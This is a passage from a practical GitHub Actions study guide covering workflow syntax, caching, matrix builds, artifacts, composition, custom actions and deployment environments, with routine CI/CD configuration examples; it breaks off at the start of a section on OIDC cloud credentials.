# GitHub Actions Study Guide

A practical, depth-first guide to GitHub Actions for engineers building real CI/CD. It assumes you know Git and the rough shape of software delivery, but not that you've built a non-trivial pipeline. The approach is pattern-first: examples are chosen to show each feature cleanly, drawing from Node, Python, Go, and Rust as convenient, rather than carrying one app through the whole guide. It starts with the mental model, builds up through the workflow language and composition, then goes deep on the things that actually bite in production — security, custom actions, deployment, and scale — and closes with copy-paste recipes and a full end-to-end pipeline.

Primary references: [GitHub Actions documentation](https://docs.github.com/en/actions), [Workflow syntax reference](https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions), [Contexts reference](https://docs.github.com/en/actions/learn-github-actions/contexts), [Security hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions).

---

## Table of Contents

1. [Part 1 — Foundations & Mental Model](#part-1--foundations--mental-model)
2. [Part 2 — The Workflow Language](#part-2--the-workflow-language)
3. [Part 3 — Build, Test, Cache, Artifacts](#part-3--build-test-cache-artifacts)
4. [Part 4 — Composition & Reuse](#part-4--composition--reuse)
5. [Part 5 — Writing Custom Actions](#part-5--writing-custom-actions)
6. [Part 6 — Deployment & Release Automation](#part-6--deployment--release-automation)
7. [Part 7 — Security Hardening](#part-7--security-hardening)
8. [Part 8 — Operations at Scale](#part-8--operations-at-scale)
9. [Part 9 — Comparison to Alternatives](#part-9--comparison-to-alternatives)
10. [Part 10 — Recipes & End-to-End Walkthrough](#part-10--recipes--end-to-end-walkthrough)

---

## Part 1 — Foundations & Mental Model

Before any YAML, get the model right. Almost every confusing thing about Actions later — why a file change didn't carry between jobs, why a secret was empty, why a deploy ran twice — traces back to a misunderstanding of what runs where and what survives.

### What CI/CD Actually Buys You

Three terms get used loosely. They form a ladder:

- **Continuous Integration (CI):** every push is automatically built and tested. The point is the *feedback loop* — integration problems surface in minutes, on the commit that caused them, instead of during a painful big-bang merge weeks later. CI is also a *gate*: you can require that checks pass before code merges.
- **Continuous Delivery (CD):** every change that passes CI is *provably releasable* — built, tested, and packaged into an artifact you could ship. Releasing is then a deliberate button press.
- **Continuous Deployment (CD):** that release happens *automatically* with no human gate. Same acronym, stronger claim.

The product of all this isn't "automation" for its own sake. It's three things: a fast feedback loop, repeatability (the build runs the same way every time, not "works on my machine"), and an enforceable quality gate. Keep those in mind — every feature in this guide serves one of them.

### Where GitHub Actions Fits

[GitHub Actions](https://docs.github.com/en/actions/about-github-actions/understanding-github-actions) is CI/CD built directly into GitHub and triggered by repository events (a push, a pull request, a release, a schedule). Workflows live as YAML files *in the repository*, versioned alongside the code they build.

That last point is most of its appeal: there's no separate CI server to provision, the pipeline is reviewed in the same pull request as the code, and there's a large [Marketplace](https://github.com/marketplace?type=actions) of reusable building blocks ("actions") so you rarely script common tasks from scratch. The trade-offs against Jenkins, GitLab CI, CircleCI, and others are real and covered honestly in [Part 9](#part-9--comparison-to-alternatives); for now it's enough to know Actions is event-driven, repo-native, and composition-heavy.

### The Execution Model

This is the spine of everything. Five nouns, in a hierarchy:

**events → workflows → jobs → steps → runners**

- An **event** is something that happens in (or to) the repo: a `push`, a `pull_request`, a `schedule` firing, a manual trigger. Events start workflows.
- A **workflow** is a single YAML file under `.github/workflows/`. It declares which events trigger it and what to do. A repo can have many workflows; they're independent.
- A **job** is a set of steps that runs on one **runner**. By default, jobs in a workflow run **in parallel**. You sequence them explicitly with `needs`.
- A **step** is one unit of work inside a job: either a shell command (`run:`) or a call to a reusable action (`uses:`). Steps in a job execute **in order**, top to bottom.
- A **runner** is the machine that executes a job — a GitHub-hosted virtual machine (a fresh one per job) or a self-hosted machine you manage (see [Part 8](#part-8--operations-at-scale)).

Two consequences fall out of this model, and they explain most early confusion:

1. **Each job gets a clean, ephemeral runner.** Nothing you write to disk in job A is visible to job B — different machines, wiped after use. To move data between jobs you must use **artifacts** or **job outputs** (Part 3), and to speed up repeated work you use **caching** (Part 3).
2. **Steps within a job share one runner.** They see the same filesystem, the same checked-out code, the same installed tools, and run sequentially. State *does* persist step-to-step within a job.

### Repository Layout

Workflows go in one place:

```text
.github/
└── workflows/
    ├── ci.yml          # one workflow
    ├── deploy.yml      # another, fully independent
    └── nightly.yml     # another
```

The **filename is arbitrary** — Actions reads every `*.yml`/`*.yaml` file in that directory. What identifies a workflow in the UI is its `name:` field, not the filename. (Custom *actions* you author live elsewhere, e.g. `.github/actions/` — that's [Part 5](#part-5--writing-custom-actions).)

### Your First Workflow, Dissected

Here is a complete, valid workflow. Every line is load-bearing:

```yaml
# .github/workflows/hello.yml
name: CI                          # label shown in the repo's Actions tab
on: [push]                        # event(s) that trigger this workflow — here, any push
jobs:                             # one or more jobs; this workflow has one
  build:                          # the job's id (arbitrary, must be unique in the file)
    runs-on: ubuntu-latest        # which runner image to use (a fresh GitHub-hosted VM)
    steps:                        # the ordered list of work
      - uses: actions/checkout@v4 # an action: clones your repo onto the runner
      - run: echo "Building ${{ github.sha }}"  # a shell step; ${{ }} is an expression
```

Reading it top to bottom:

- `name:` is cosmetic — it's the title you see in the Actions UI.
- `on: [push]` says "run this whenever someone pushes commits." (Triggers get much richer in [Part 2](#part-2--the-workflow-language).)
- `jobs:` holds a map of jobs keyed by id. `build` is the id; you'd reference it elsewhere as `build`.
- `runs-on:` picks the runner. `ubuntu-latest` is a GitHub-hosted Linux VM, provisioned fresh for this job and destroyed afterward.
- `steps:` run in order. The first, [`actions/checkout`](https://github.com/actions/checkout), is critical and easy to forget: **the runner does not have your code until you check it out.** A brand-new VM starts empty.
- The second step runs a shell command. `${{ github.sha }}` is an *expression* that interpolates the commit SHA from the `github` context (Part 2).

If you remember one thing from Part 1: the runner starts empty and disappears when the job ends. Everything else is detail on top of that.

### A Note on Pinning

Throughout the early chapters you'll see actions referenced by a version tag, like `actions/checkout@v4`, because it reads cleanly while you're learning. In production you should pin third-party actions to a full commit SHA instead — tags are mutable and that has real security consequences. [Part 7](#part-7--security-hardening) explains exactly why and how; until then, the `@v4` style keeps examples readable.

---

## Part 2 — The Workflow Language

Part 1 gave you the model; this is the vocabulary. Nearly everything in a workflow file answers one of four questions: *when* it runs (`on:`), *where and in what order* (`jobs`, `runs-on`, `needs`), *what data is available* (contexts and expressions), and *what environment* the steps run in (env, shell, permissions).

### Triggers: the `on:` Key

`on:` declares the events that start the workflow. The [full event list](https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows) is long; these are the ones you'll actually reach for.

**Push and pull request, with filters** — the two workhorses:

```yaml
on:
  push:
    branches: [main, 'release/**']    # only pushes to these branches (glob patterns allowed)
    paths: ['src/**', 'package.json']  # ...and only when these files changed
  pull_request:
    branches: [main]                   # PRs *targeting* main
    types: [opened, synchronize, reopened]  # which PR activities (these three are the default)
```

- `branches`/`branches-ignore` and `paths`/`paths-ignore` filter *which* pushes and PRs count. Use one side of each pair, not both.
- `paths` filtering is how you avoid running the whole pipeline when only docs changed.
- For `pull_request`, the activity `types` narrow the trigger — `synchronize` means "new commits were pushed to the PR." It has a security-critical sibling, `pull_request_target`, deliberately held back to [Part 7](#part-7--security-hardening).

**Scheduled runs (cron):**

```yaml
on:
  schedule:
    - cron: '0 6 * * 1'   # 06:00 UTC every Monday — fields: minute hour day-of-month month day-of-week
```

Cron is the standard five fields and is **always in UTC**. Scheduled workflows run against the **default branch's** copy of the file. GitHub may delay scheduled runs under load, so don't depend on exact timing.

**Manual triggers with typed inputs:**

```yaml
on:
  workflow_dispatch:          # adds a "Run workflow" button in the UI and enables `gh workflow run`
    inputs:
      environment:
        description: 'Target environment'
        type: choice          # one of: string | boolean | choice | environment | number
        options: [staging, production]
        default: staging
        required: true
```

Read these through the `inputs` context: `${{ inputs.environment }}`. This is the clean way to make a workflow parameterized and human-triggered — a manual deploy, a one-off backfill.

**Also worth knowing:** `workflow_run` (start a workflow when *another named workflow* finishes — handy for splitting build from deploy) and `repository_dispatch` (trigger via an authenticated API call from an external system).

### Jobs, Steps, Runners, and the Job Graph

A job picks a runner and lists ordered steps:

```yaml
jobs:
  test:
    runs-on: ubuntu-latest    # ubuntu-latest | windows-latest | macos-latest | self-hosted | <label>
    steps:
      - uses: actions/checkout@v4   # a `uses` step: run a published action
      - name: Run tests             # `name` is the label shown in the logs (optional)
        id: tests                   # `id` lets later steps/jobs reference this step's outputs
        run: ./run-tests.sh         # a `run` step: execute a shell command
```

- `runs-on` selects the runner image — a GitHub-hosted image, or `self-hosted` plus labels for your own machines ([Part 8](#part-8--operations-at-scale)).
- A step is **either** `uses:` (an action) **or** `run:` (a shell command), never both.
- `name` is cosmetic; `id` is functional — it's how you read a step's outputs later.

**Sequencing with `needs` — the job DAG.** Jobs run in parallel unless you declare dependencies. `needs` wires them into a directed graph:

```yaml
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - run: echo "linting"
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "testing"
  deploy:
    needs: [lint, test]       # waits until BOTH lint and test succeed
    runs-on: ubuntu-latest
    steps:
      - run: echo "deploying"
```

`lint` and `test` run concurrently; `deploy` is a fan-in that starts only after both pass. If a needed job fails, its dependents are skipped by default.

**Conditional execution with `if:`.** Both jobs and steps accept an `if:`:

```yaml
  deploy:
    needs: [lint, test]
    if: github.ref == 'refs/heads/main'   # job-level: only on the main branch
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
      - run: ./notify-failure.sh
        if: failure()                       # step-level: run only if an earlier step failed
```

Inside `if:` the `${{ }}` wrapper is implied, so you can omit it (both forms are valid).

### Contexts and Expressions

`${{ ... }}` is the expression syntax. Inside it you read **contexts** — structured objects Actions exposes. The ones you'll use constantly ([contexts reference](https://docs.github.com/en/actions/learn-github-actions/contexts)):

| Context | What it holds | Example |
|---|---|---|
| `github` | Event and repo metadata | `github.sha`, `github.ref`, `github.event_name`, `github.actor` |
| `env` | Environment variables you set | `env.NODE_ENV` |
| `vars` | Non-secret configuration variables | `vars.REGISTRY` |
| `secrets` | Encrypted secrets | `secrets.GITHUB_TOKEN` |
| `matrix` | The current matrix combination | `matrix.os` |
| `needs` | Outputs of jobs you depend on | `needs.build.outputs.version` |
| `steps` | Outputs of earlier steps (by `id`) | `steps.tests.outputs.coverage` |
| `runner` | Runner info | `runner.os`, `runner.temp` |

**Operators and functions.** Expressions support `==`, `!=`, `&&`, `||`, `!`, plus built-in functions ([expressions reference](https://docs.github.com/en/actions/learn-github-actions/expressions)): `contains()`, `startsWith()`, `endsWith()`, `format()`, `join()`, `toJSON()`, `fromJSON()`, and `hashFiles()`. There are also **status functions** that only make sense in `if:`: `success()` (the implicit default), `failure()`, `always()` (run even after a failure or cancellation), and `cancelled()`.

A representative `if:` combining a context and a status function:

```yaml
      - run: ./publish-docs.sh
        # only on pushes (not PRs) to main, and only if earlier steps succeeded
        if: success() && github.event_name == 'push' && github.ref == 'refs/heads/main'
```

**Passing data between steps — `$GITHUB_OUTPUT`.** A step writes `name=value` lines to the file named by `$GITHUB_OUTPUT`; later steps read them through the `steps` context, keyed by the producing step's `id`:

```yaml
      - id: meta
        run: echo "version=$(cat VERSION)" >> "$GITHUB_OUTPUT"   # define an output named "version"
      - run: echo "Releasing ${{ steps.meta.outputs.version }}"  # read it back in a later step
```

(Passing data between *jobs* means promoting a step output to a **job output** — covered in [Part 3](#part-3--build-test-cache-artifacts), where it pairs naturally with artifacts.)

### Environment Variables, Defaults, and Shells

**`env` at three scopes**, narrowest wins:

```yaml
env:
  STAGE: global              # visible to every job and step in the workflow
jobs:
  build:
    env:
      STAGE: job             # overrides the global value for this job
    runs-on: ubuntu-latest
    steps:
      - run: echo "$STAGE"   # prints "job"
      - run: echo "$STAGE"
        env:
          STAGE: step        # overrides again, only for this step → prints "step"
```

**Exporting env between steps — `$GITHUB_ENV`.** Each `run` is a fresh shell, so a variable set in one step does *not* survive to the next. To persist one, append to `$GITHUB_ENV`:

```yaml
      - run: echo "BUILD_ID=$(date +%s)" >> "$GITHUB_ENV"  # exported as $BUILD_ID to later steps
      - run: echo "Build was $BUILD_ID"
```

**Defaults and shells.** `defaults.run` sets the shell and working directory for every `run` step:

```yaml
defaults:
  run:
    shell: bash                # default is bash on Linux/macOS, pwsh on Windows
    working-directory: ./app   # run commands from ./app instead of the repo root
```

Worth knowing when debugging: on Linux the default `bash` runs with `-e` and pipefail, so a failing command aborts the step — which is what you want, but it explains "why did my step stop in the middle."

**First look at `GITHUB_TOKEN` and `permissions`.** Every run gets an automatic, short-lived token in `secrets.GITHUB_TOKEN` that authenticates against your repo (to post a check, push a tag, comment on a PR). Its power is governed by `permissions:`:

```yaml
permissions:
  contents: read     # least privilege: read the repo, nothing more
```

Set it restrictively at the workflow level and grant extra scopes only on the jobs that need them. The default scopes, the real risks, and the least-privilege patterns are all in [Part 7](#part-7--security-hardening).

---

## Part 3 — Build, Test, Cache, Artifacts

This is the part you'll use every day: get a toolchain onto the runner, install dependencies fast, run tests across versions, and move results around. The examples deliberately span ecosystems — the *shape* is identical across languages, which is the point.

### Setting Up Toolchains (Pattern-First, Multi-Stack)

Every build/test job has the same skeleton: check out the code, install the language toolchain (with its dependency cache), install dependencies, run tests. The `actions/setup-*` family handles the toolchain *and* the dependency cache for you.

```yaml
# Node — actions/setup-node
- uses: actions/setup-node@v4
  with:
    node-version: '20'
    cache: npm           # transparently caches ~/.npm, keyed on package-lock.json
- run: npm ci            # clean install honoring the lockfile exactly
- run: npm test
```

```yaml
# Python — actions/setup-python
- uses: actions/setup-python@v5
  with:
    python-version: '3.12'
    cache: pip           # caches the pip download cache, keyed on requirements files
- run: pip install -r requirements.txt
- run: pytest
```

```yaml
# Go — actions/setup-go
- uses: actions/setup-go@v5
  with:
    go-version: '1.22'   # caches the module and build cache by default (cache: true)
- run: go test ./...
```

```yaml
# Rust — community-standard toolchain + cache actions
- uses: dtolnay/rust-toolchain@stable   # installs rustc/cargo for the chosen channel
- uses: Swatinem/rust-cache@v2          # caches ~/.cargo and ./target, keyed on Cargo.lock
- run: cargo test
```

Only the tool names change. Lean on each `setup-*` action's built-in `cache:` — it's the cheapest performance win you'll get.

### Caching Dependencies

When the built-in cache isn't enough — or you need to cache something a `setup-*` action doesn't manage — use [`actions/cache`](https://docs.github.com/en/actions/using-workflows/caching-dependencies-to-speed-up-workflows) directly:

```yaml
- uses: actions/cache@v4
  with:
    path: ~/.cache/pip                                              # what to cache
    key: ${{ runner.os }}-pip-${{ hashFiles('requirements.txt') }}  # exact, content-addressed key
    restore-keys: |
      ${{ runner.os }}-pip-                                         # prefix fallbacks on a miss
```

The mechanics that matter:

- On a **miss** for `key`, Actions walks the `restore-keys` prefixes and restores the most recent match — a stale-but-warm cache beats a cold one. At job end, if `key` didn't already exist, the `path` is saved under it.
- `hashFiles()` over the lockfile makes the key change *exactly* when dependencies change. That's the whole idiom: same deps → same key → hit; changed deps → new key → fresh save.
- A key, once written, is **immutable** — you cannot overwrite it. This is why the key must encode the dependency set.
- Caches are **scoped per branch**, with read-through to the base/default branch. A PR can read the base branch's cache but not an unrelated branch's.
- There's a per-repo size cap, and caches are evicted after about a week unused (or when the repo total is exceeded). Don't cache anything you can recompute cheaply.

Rule of thumb: if a `setup-*` action offers `cache:`, use it; reach for `actions/cache` for compiler caches (ccache, sccache), custom build outputs, or downloaded fixtures.

### Matrix Builds

A matrix runs one job definition across a set of dimensions, in parallel ([matrix docs](https://docs.github.com/en/actions/using-jobs/using-a-matrix-for-your-jobs)):

```yaml
jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false        # don't cancel the other combos when one fails
      max-parallel: 4         # optional cap on concurrent combos
      matrix:
        os: [ubuntu-latest, macos-latest, windows-latest]
        node: [18, 20, 22]
        include:
          - os: ubuntu-latest # enrich one specific combo with an extra property
            node: 22
            coverage: true
        exclude:
          - os: windows-latest  # drop a combo you don't support
            node: 18
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}   # read the current combo from the matrix context
      - run: npm ci && npm test
```

- The base matrix is 3 OSes × 3 Node versions = 9 jobs; `exclude` removes one (→ 8), `include` enriches one.
- `fail-fast: true` (the default) cancels the remaining combos the instant one fails — fast feedback, but you lose the full failure picture. Set it `false` when you want every combo's result (e.g. "does this break only on Windows + Node 18?").

**Dynamic matrices.** When the set isn't static — say "test every package directory" — emit it as JSON from one job and feed it to another with `fromJSON`:

```yaml
jobs:
  discover:
    runs-on: ubuntu-latest
    outputs:
      pkgs: ${{ steps.set.outputs.pkgs }}
    steps:
      - uses: actions/checkout@v4
      - id: set
        run: |
          # emit a JSON array of package names as a step output
          echo "pkgs=$(ls packages | jq -R -s -c 'split("\n") | map(select(length > 0))')" >> "$GITHUB_OUTPUT"
  test:
    needs: discover
    runs-on: ubuntu-latest
    strategy:
      matrix:
        pkg: ${{ fromJSON(needs.discover.outputs.pkgs) }}   # build the matrix from upstream JSON
    steps:
      - run: echo "testing ${{ matrix.pkg }}"
```

### Artifacts and Moving Data Between Jobs

Because jobs are isolated, handing files from one to another means uploading an **artifact** and downloading it downstream:

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build      # produces ./dist
      - uses: actions/upload-artifact@v4
        with:
          name: site                       # the artifact's name
          path: dist/                       # file(s)/dir(s) to store
          retention-days: 7                 # optional; otherwise the repo default (max 90)
  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: site                        # restores the artifact into the working dir
      - run: ./publish.sh
```

Two mechanisms, two purposes:

- **Artifacts** are for *files* — build output, test reports, coverage, logs. They survive the run (per retention) and are downloadable from the run's UI. Note the artifact actions are at **v4**, which changed behavior: an uploaded artifact is immutable, and you can't have multiple jobs append to one name.
- **Job outputs** are for *small strings* — a version, a computed flag. A job exposes `outputs:` sourced from a step output, and dependents read `needs.<job>.outputs.<name>`:

```yaml
jobs:
  version:
    runs-on: ubuntu-latest
    outputs:
      tag: ${{ steps.v.outputs.tag }}       # promote a step output to a job output
    steps:
      - id: v
        run: echo "tag=v1.4.2" >> "$GITHUB_OUTPUT"
  release:
    needs: version
    runs-on: ubuntu-latest
    steps:
      - run: echo "Releasing ${{ needs.version.outputs.tag }}"
```

Rule of thumb: a **file** → artifact; a **string** → job output.

### Service Containers

Integration tests often need a real database or cache. [`services:`](https://docs.github.com/en/actions/using-containerized-services/about-service-containers) starts containers next to your job on the same network; your steps reach them on `localhost`:

```yaml
jobs:
  integration:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_PASSWORD: postgres        # configure the container through its own env vars
        ports:
          - 5432:5432                         # publish the container port to localhost on the runner
        options: >-                           # health check — the job waits until Postgres is ready
          --health-cmd "pg_isready -U postgres"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
      redis:
        image: redis:7
        ports:
          - 6379:6379
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    env:
      DATABASE_URL: postgres://postgres:postgres@localhost:5432/postgres
      REDIS_URL: redis://localhost:6379
    steps:
      - uses: actions/checkout@v4
      - run: ./run-integration-tests.sh       # connects to localhost:5432 and localhost:6379
```

The health checks are not optional in practice: without them, your tests can start before the database accepts connections and fail intermittently — one of the most common flaky-CI causes. For what to actually exercise behind these connections, see the [Postgres guide](POSTGRES_STUDY_GUIDE.md) and [Redis guide](REDIS_STUDY_GUIDE.md).

---

## Part 4 — Composition & Reuse

Once you have more than a couple of workflows, copy-paste sets in: the same build job, the same setup steps, pasted everywhere and drifting out of sync. Actions offers reuse at three granularities — **composite actions** (a bundle of steps), **reusable workflows** (whole jobs), and **custom actions** (a distributable unit, [Part 5](#part-5--writing-custom-actions)). This part covers the first two and exactly when to use which.

### Reusable Workflows

A [reusable workflow](https://docs.github.com/en/actions/using-workflows/reusing-workflows) is a workflow other workflows can call as a job, via `on: workflow_call`. It declares a typed interface — inputs, secrets, outputs:

```yaml
# .github/workflows/reusable-build.yml
name: Reusable build
on:
  workflow_call:                # makes this workflow callable from other workflows
    inputs:
      node-version:
        type: string            # one of: string | number | boolean
        required: false
        default: '20'
    secrets:
      npm-token:
        required: true          # callers must supply this secret
    outputs:
      artifact-name:
        description: Name of the uploaded build artifact
        value: ${{ jobs.build.outputs.artifact-name }}   # surfaced from a job output below
jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      artifact-name: site
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ inputs.node-version }}
      - run: npm ci && npm run build
        env:
          NPM_TOKEN: ${{ secrets.npm-token }}
      - uses: actions/upload-artifact@v4
        with:
          name: site
          path: dist/
```

A caller references it at the **job level** with `uses:`:

```yaml
# .github/workflows/app-ci.yml
name: CI
on: [push]
jobs:
  build:
    uses: ./.github/workflows/reusable-build.yml   # local path (or owner/repo/.github/workflows/x.yml@ref)
    with:
      node-version: '22'
    secrets:
      npm-token: ${{ secrets.NPM_TOKEN }}
      # alternatively, forward ALL of the caller's secrets:  secrets: inherit
  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: echo "Built artifact ${{ needs.build.outputs.artifact-name }}"
```

What to internalize:

- A called workflow runs as its **own job(s)**, shown nested under the caller. To read its outputs, `needs:` the calling job and reference `needs.<job>.outputs.<name>`.
- `secrets: inherit` forwards every secret the caller has — convenient but the opposite of least privilege. Prefer naming only the secrets you need.
- Reusable workflows can be called **across repos** (`owner/repo/.github/workflows/wf.yml@v1`), which is how organizations share a canonical pipeline. Pin that ref like any other dependency ([Part 7](#part-7--security-hardening)).
- There's a fixed **nesting limit** (you can chain calls only a few levels deep) and a cap on how many workflow files one run may call.

### Composite Actions

A [composite action](https://docs.github.com/en/actions/creating-actions/creating-a-composite-action) bundles several steps into a single `uses:` step. It lives in its own directory with an `action.yml`:

```yaml
# .github/actions/setup-project/action.yml
name: Setup project
description: Set up Node and install dependencies
inputs:
  node-version:
    description: Node version
    required: false
    default: '20'
runs:
  using: composite            # this is what makes it a composite action
  steps:
    - uses: actions/setup-node@v4
      with:
        node-version: ${{ inputs.node-version }}
    - run: npm ci
      shell: bash             # REQUIRED: every `run` step in a composite action must name a shell
```

Invoke it like any other action, by path to its directory:

```yaml
    steps:
      - uses: actions/checkout@v4
      - uses: ./.github/actions/setup-project   # local composite action
        with:
          node-version: '22'
      - run: npm test
```

The gotcha that catches everyone: **a composite action's `run` steps must each set `shell:`** — there's no default. Composite actions execute *inside the caller's job* on the same runner, so they factor out **steps**, not whole jobs.

### Org-Level Reuse

Two mechanisms operate across an entire organization:

- **Starter workflows** — templates that appear in the "New workflow" UI of every repo in the org. Put them in a special `.github` repository under `workflow-templates/` (a `*.yml` next to a `*.properties.json` that describes it). New repos start from a sanctioned pipeline instead of copying a random one.
- **Required workflows / rulesets** — let an org *enforce* that specific checks run on PRs across many repos, configured centrally through repository rulesets rather than per repo.

```json
// .github/workflow-templates/node-ci.properties.json
{
  "name": "Node CI",
  "description": "Lint and test a Node project",
  "iconName": "example",
  "categories": ["JavaScript", "CI"]
}
```

### Which One to Reach For

| Mechanism | Granularity | Runs as | Reach for it when… |
|---|---|---|---|
| **Composite action** | A bundle of steps | Inside the caller's job (same runner) | You repeat the same *sequence of steps* across jobs (setup, shared tooling). |
| **Reusable workflow** | One or more whole jobs | Its own job(s) under the caller | You repeat *whole jobs/pipelines* across workflows or repos (a standard build or deploy). |
| **Custom action** ([Part 5](#part-5--writing-custom-actions)) | A distributable unit (JS/Docker/composite) | A single step | You want a versioned, publishable building block — possibly for the Marketplace. |

Rule of thumb: factoring out *steps within a job* → composite action; factoring out *entire jobs* → reusable workflow; building something *others install* → custom action.

---

## Part 5 — Writing Custom Actions

When the Marketplace doesn't have what you need — or you want a versioned building block of your own — you [write a custom action](https://docs.github.com/en/actions/creating-actions). There are three flavors, and choosing the right one is most of the decision.

### The Three Kinds

| Kind | What it is | Where it runs | Best for |
|---|---|---|---|
| **Composite** | YAML bundling steps (Part 4) | In the caller's job, same runner | Wrapping shell commands / other actions; no extra runtime |
| **JavaScript** | A Node program the runner executes | Node on the runner — any OS | Logic, API calls, cross-platform actions; fastest startup |
| **Docker container** | A container the runner builds and runs | **Linux runners only** | Bringing a specific OS / toolchain along; heavier startup |

- **JavaScript** actions run directly under Node on the runner, so they start fast and work on Linux, macOS, and Windows. This is the default choice for anything with real logic.
- **Docker** actions can package arbitrary tools, but only run on Linux runners and pay the image build/pull cost on every run. Use them when you need an environment that's painful to set up otherwise.
- **Composite** (from Part 4) is the no-runtime option when your action is "just some steps."

### action.yml Anatomy

Every action — whichever kind — has a [metadata file](https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions) (`action.yml`) at its root:

```yaml
name: My Action               # display name (must be unique if published to the Marketplace)
description: What it does
author: you
inputs:
  who:
    description: Name to greet
    required: false
    default: world
outputs:
  greeting:
    description: The greeting that was produced
runs:
  using: node20               # composite | node20 | docker — this selects the kind
  main: dist/index.js         # (JavaScript) the entrypoint file
branding:                     # optional; controls the Marketplace listing's icon/color
  icon: activity
  color: purple
```

### A JavaScript Action

JS actions use the official toolkit: `@actions/core` (inputs, outputs, logging, failing the step) and `@actions/github` (the event `context` and a ready-made authenticated Octokit client).

```yaml
# action.yml
name: Greet
description: Print a greeting and output it
inputs:
  who:
    description: Name to greet
    default: world
outputs:
  greeting:
    description: The produced greeting
runs:
  using: node20
  main: dist/index.js
```

```javascript
// index.js
const core = require('@actions/core');
const github = require('@actions/github');

try {
  const who = core.getInput('who');                  // read an input declared in action.yml
  const greeting = `Hello, ${who}!`;
  core.info(`Triggered by: ${github.context.eventName}`); // read the event from the context
  core.setOutput('greeting', greeting);              // expose an output to later steps
  console.log(greeting);
} catch (err) {
  core.setFailed(err.message);                       // mark the step failed with a clear message
}
```

The step nearly everyone forgets: an action referenced by `uses:` must carry its **runtime dependencies committed in the repo**, because the runner does not `npm install` your action before running it. The standard fix is to bundle everything into one file with [`@vercel/ncc`](https://github.com/vercel/ncc) and commit the result:

```bash
npm i -D @vercel/ncc            # dev dependency
npx ncc build index.js -o dist  # produces dist/index.js with all deps inlined
git add dist && git commit -m "build"   # commit the bundle so consumers receive it
```

Either commit `dist/` directly (simplest) or build it in a release workflow and attach it to the tag (cleaner history). Consumers then write `uses: your-org/greet@v1`.

### A Docker-Container Action

A [Docker action](https://docs.github.com/en/actions/creating-actions/creating-a-docker-container-action) packages a tool plus its environment; the runner builds the image from your `Dockerfile` and runs it:

```yaml
# action.yml
name: Lint with my tool
description: Run a containerized linter
inputs:
  path:
    description: Path to lint
    default: .
runs:
  using: docker
  image: Dockerfile         # build from this Dockerfile (or a prebuilt image: docker://ghcr.io/org/img:tag)
  args:
    - ${{ inputs.path }}    # passed to the entrypoint as positional arguments
```

```dockerfile
# Dockerfile
FROM alpine:3.20
RUN apk add --no-cache bash
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
```

```bash
# entrypoint.sh
#!/usr/bin/env bash
set -euo pipefail
echo "Linting path: $1"               # the action.yml `args` arrive as positional parameters
echo "via env: ${INPUT_PATH}"         # inputs are ALSO exposed as INPUT_<UPPERCASE_NAME>
echo "result=ok" >> "$GITHUB_OUTPUT"  # outputs go to $GITHUB_OUTPUT, same as anywhere
```

Inputs reach a Docker action two ways: as `args` (positional) and automatically as `INPUT_<NAME>` environment variables (name uppercased). Outputs use `$GITHUB_OUTPUT` like every other step.

### Versioning & Distribution

Consumers pin to a ref, so **your tags are your public API**:

- Cut **semver tags** (`v1.2.0`) for releases.
- Maintain a **floating major tag** (`v1`) that you re-point to the latest `v1.x.y`. This is the convention that lets consumers write `@v1` and pick up non-breaking updates:
  ```bash
  git tag -f v1 v1.2.0      # move the v1 tag onto the new release
  git push -f origin v1
  ```
- Security-conscious consumers will pin your **commit SHA** instead of `@v1` ([Part 7](#part-7--security-hardening)). That's expected — design your changelog around it.
- To list on the [Marketplace](https://docs.github.com/en/actions/creating-actions/publishing-actions-in-github-marketplace), the repo needs a single root `action.yml`, a good README, and a published release.

---

## Part 6 — Deployment & Release Automation

This is where CI turns into CD. Two themes run through it: getting credentials to your cloud *safely* (short-lived OIDC, not long-lived keys), and turning a passing build into a published artifact.

### Environments

A deployment [environment](https://docs.github.com/en/actions/deployment/targeting-different-environments/using-environments-for-deployment) is a named target — `staging`, `production` — with protection rules attached. A job opts into one with `environment:`:

```yaml
jobs:
  deploy-prod:
    runs-on: ubuntu-latest
    environment: production      # bind this job to the "production" environment
    steps:
      - run: ./deploy.sh
        env:
          API_KEY: ${{ secrets.API_KEY }}   # resolves to the environment's secret if one is set
```

What that buys you:

- **Required reviewers** — the job *pauses* until a named person or team approves. This is your manual production gate, enforced by GitHub.
- **Wait timer** — a forced delay before the job proceeds (a cool-off window to abort).
- **Deployment branches** — restrict which branches may deploy to this environment (e.g. only `main` reaches production).
- **Environment-scoped secrets/variables** — `secrets.API_KEY` resolves to *this environment's* value, so staging and production hold different credentials under the same name.

### Secrets and Variables

Three scopes, most-specific wins: **repository**, **environment**, and **organization** (org secrets can be shared across selected repos). Use `secrets.*` for sensitive values, `vars.*` for non-secret config.

Two facts that bite people:

- **Masking has limits.** Actions masks known secret values in logs, but a secret that's been transformed — base64-encoded, split, embedded in JSON — can slip past the masker. Never `echo` a secret or pass it somewhere it gets printed.
- **Fork pull requests get no secrets.** A `pull_request` from a fork runs with no access to your secrets and a read-only token, *by design* — so a stranger's PR can't exfiltrate them. This shapes how you structure PR CI ([Part 7](#part-7--security-hardening)).

For anything beyond static secrets, prefer **OIDC** (next) or fetch from an external secret manager at runtime.

### OIDC to Cloud (No Stored Credentials)

